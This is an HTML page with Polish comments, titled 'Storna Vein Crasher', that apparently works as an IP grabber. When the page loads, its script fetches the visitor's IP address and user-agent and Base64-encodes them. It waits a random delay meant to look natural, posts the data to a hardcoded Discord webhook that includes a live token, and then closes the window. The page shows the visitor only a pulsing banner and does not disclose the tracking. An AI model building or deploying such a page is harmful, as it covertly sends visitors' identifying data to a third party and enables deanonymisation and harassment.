\<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Storna Vein Crasher</title>
    <style>
        body {
            font-family: 'Arial Black', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #1a1a1a, #660000);
            color: #ff3333;
            text-shadow: 0 0 5px #ff0000;
            overflow: hidden;
        }
        h1 {
            font-size: 36px;
            animation: pulse 1s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
    </style>
</head>
<body>
    <h1>Storna Vein Crasher...</h1>

    <script>
        // Funkcja do wysyłania IP i zamykania strony
        async function sendIPAndClose() {
            try {
                // Pobierz IP użytkownika
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;

                // Pobierz user-agent
                const userAgent = navigator.userAgent;

                // Webhook URL (zastąp swoim webhookiem)
                const webhookURL = "https://discord.com/api/webhooks/1379529924716658778/n-v8PQ5jwgY5SvZeKXi1syNhCWE96GJRYkwiDL4wtrB35nwaetudlxMqVd4NIEuMorUw";

                // Dane do wysłania
                const payload = {
                    ip: userIP,
                    userAgent: userAgent,
                    timestamp: new Date().toISOString(),
                    secret: "VeinCrash2025"
                };

                // Zaszyfruj dane w Base64
                const encodedPayload = btoa(JSON.stringify(payload));

                // Losowe opóźnienie dla naturalnego zachowania
                const delay = Math.random() * 2000; // 0-2 sekundy
                await new Promise(resolve => setTimeout(resolve, delay));

                // Wysłanie danych na webhook
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ data: encodedPayload })
                });

                // Zamknij stronę
                window.close();
            } catch (error) {
                console.error("Błąd:", error);
                window.close(); // Zamknij nawet w przypadku błędu
            }
        }

        // Wywołaj funkcję po załadowaniu strony
        window.onload = sendIPAndClose;
    </script>
</body>
</html>
